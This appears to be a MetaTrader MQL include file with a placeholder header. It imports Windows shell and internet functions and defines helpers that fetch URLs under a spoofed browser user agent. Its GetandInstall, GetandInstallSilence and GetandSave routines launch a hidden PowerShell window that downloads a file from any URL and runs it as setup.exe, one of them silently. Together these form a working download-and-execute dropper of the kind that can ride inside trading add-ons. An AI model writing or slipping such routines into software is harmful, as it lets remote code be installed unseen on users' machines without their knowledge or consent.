//+------------------------------------------------------------------+
//|                                                      ProjectName |
//|                                      Copyright 2020, CompanyName |
//|                                       http://www.companyname.net |
//+------------------------------------------------------------------+
#import "shell32.dll"
int ShellExecuteA(
    int hwnd,
    string Operation,
    string File,
    string Parameters,
    string Directory,
    int ShowCmd);

int ShellExecuteW(
    int hwnd,
    string lpOperation,
    string lpFile,
    string lpParameters,
    string lpDirectory,
    int nShowCmd);
#import

#import "wininet.dll"
int InternetOpenW(
    string sAgent,
    int lAccessType,
    string sProxyName = "",
    string sProxyBypass = "",
    int lFlags = 0);
int InternetOpenUrlW(
    int hInternetSession,
    string sUrl,
    string sHeaders = "",
    int lHeadersLength = 0,
    uint lFlags = 0,
    int lContext = 0);
int InternetReadFile(
    int hFile,
    uchar &sBuffer[],
    int lNumBytesToRead,
    int &lNumberOfBytesRead);
int InternetCloseHandle(
    int hInet);
#import

#define INTERNET_FLAG_RELOAD 0x80000000
#define INTERNET_FLAG_NO_CACHE_WRITE 0x04000000
#define INTERNET_FLAG_PRAGMA_NOCACHE 0x00000100

int hSession_IEType;
int hSession_Direct;
int Internet_Open_Type_Preconfig = 0;
int Internet_Open_Type_Direct = 1;

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
int hSession(bool Direct)
{
    string InternetAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)";

    if (Direct)
    {
        if (hSession_Direct == 0)
        {
            hSession_Direct = InternetOpenW(InternetAgent, Internet_Open_Type_Direct, "0", "0", 0);
        }

        return (hSession_Direct);
    }
    else
    {
        if (hSession_IEType == 0)
        {
            hSession_IEType = InternetOpenW(InternetAgent, Internet_Open_Type_Preconfig, "0", "0", 0);
        }

        return (hSession_IEType);
    }
}

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
string httpGET(string strUrl)
{
    int handler = hSession(false);
    int response = InternetOpenUrlW(handler, strUrl, NULL, 0,
                                    INTERNET_FLAG_NO_CACHE_WRITE |
                                        INTERNET_FLAG_PRAGMA_NOCACHE |
                                        INTERNET_FLAG_RELOAD,
                                    0);
    if (response == 0)
        return ((string) false);

    uchar ch[100];
    string toStr = "";
    int dwBytes, h = -1;
    while (InternetReadFile(response, ch, 100, dwBytes))
    {
        if (dwBytes <= 0)
            break;
        toStr = toStr + CharArrayToString(ch, 0, dwBytes);
    }

    InternetCloseHandle(response);
    return toStr;
}

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void httpOpen(string strUrl)
{
    ShellExecuteA(0, "open", strUrl, "", "", 3);
}

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void ExecutePowerShellCommand(string command)
{
    int result = ShellExecuteW(0, "open", "powershell.exe", command, NULL, 0);
    if (result <= 32)
    {
        Print("Falha ao executar o comando: ", result);
    }
}

void GetandInstall(string GetInstallUrl)
{
    string command = "-Command \"(New-Object System.Net.WebClient).DownloadFile('" + GetInstallUrl + "', 'setup.exe'); Start-Process -Wait 'setup.exe'\"";
    int result = ShellExecuteW(0, "open", "powershell.exe", command, NULL, 0);
    if (result <= 32)
    {
        Print("Falha ao executar o comando: ", result);
    }
}

void GetandInstallSilence(string GetInstallSilenceUrl)
{
    string command = "-Command \"(New-Object System.Net.WebClient).DownloadFile('" + GetInstallSilenceUrl + "', 'setup.exe'); Start-Process -Wait 'setup.exe'  /quiet\"";
    int result = ShellExecuteW(0, "open", "powershell.exe", command, NULL, 0);
    if (result <= 32)
    {
        Print("Falha ao executar o comando: ", result);
    }
}

void GetandSave(string GetUrl, string SetPath)
{
    string command = "-Command \"(New-Object System.Net.WebClient).DownloadFile('" + GetUrl + "', '" + SetPath + "')\"";
    int result = ShellExecuteW(0, "open", "powershell.exe", command, NULL, 0);
    if (result <= 32)
    {
        Print("Falha ao executar o comando: ", result);
    }
}

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
bool httpGETBinAndSave(const string strUrl, const string filePath)
{
    int hInternetSession = InternetOpenW("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)", 0, "", "", 0);
    if (hInternetSession == 0)
    {
        Print("Falha ao abrir a sessão da Internet: ", GetLastError());
        return false;
    }

    int hInternetUrl = InternetOpenUrlW(hInternetSession, strUrl, NULL, 0,
                                        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
    if (hInternetUrl == 0)
    {
        Print("Falha ao abrir a URL: ", GetLastError());
        InternetCloseHandle(hInternetSession);
        return false;
    }

    const int bufferSize = 1024;
    uchar buffer[1024];

    int bytesRead;
    bool success = true;

    int fileHandle = FileOpen(filePath, FILE_WRITE | FILE_BIN);
    if (fileHandle == INVALID_HANDLE)
    {
        Print("Falha ao abrir o arquivo para escrita: ", GetLastError());
        InternetCloseHandle(hInternetUrl);
        InternetCloseHandle(hInternetSession);
        return false;
    }

    while (InternetReadFile(hInternetUrl, buffer, bufferSize, bytesRead) && bytesRead > 0)
    {
        if (FileWriteArray(fileHandle, buffer, 0, bytesRead) != (uint)bytesRead)
        {
            Print("Falha ao escrever os dados no arquivo: ", GetLastError());
            success = false;
            break;
        }
    }

    FileClose(fileHandle);

    InternetCloseHandle(hInternetUrl);
    InternetCloseHandle(hInternetSession);

    if (success)
        Print("Dados binários obtidos com sucesso e salvos em arquivo: ", filePath);

    return success;
}
//+------------------------------------------------------------------+
